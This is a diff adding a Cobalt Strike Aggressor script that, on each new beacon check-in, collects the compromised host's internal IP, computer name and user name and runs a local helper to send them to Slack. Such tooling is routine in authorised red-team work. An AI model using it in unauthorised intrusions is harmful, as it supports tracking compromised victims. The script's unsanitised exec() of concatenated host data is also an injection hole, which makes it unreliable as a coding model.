@@ -1,0 +1,14 @@
+#Issues initial commands and notificatoin upon new beacon checkin
+#slacknotification.cna
+#This file needs to be copied to the "/cobaltstrike" directory that will be transferred to the teamserver.
+
+on beacon_initial {
+    println("Initial Beacon Checkin: " . $1 . " PID: " . beacon_info($1,"pid"));
+    local('$internalIP $computerName $userName');
+    $internalIP = replace(beacon_info($1,"internal")," ","_");
+    $computerName = replace(beacon_info($1,"computer")," ","_");
+    $userName = replace(beacon_info($1,"user")," ","_");
+    $cmd = './slackhook.py' . " --computername " . $computerName . " --internalip " . $internalIP . " --username " . $userName;
+    println("Sending Slack Notification: " . $cmd);
+    exec($cmd);
+    }
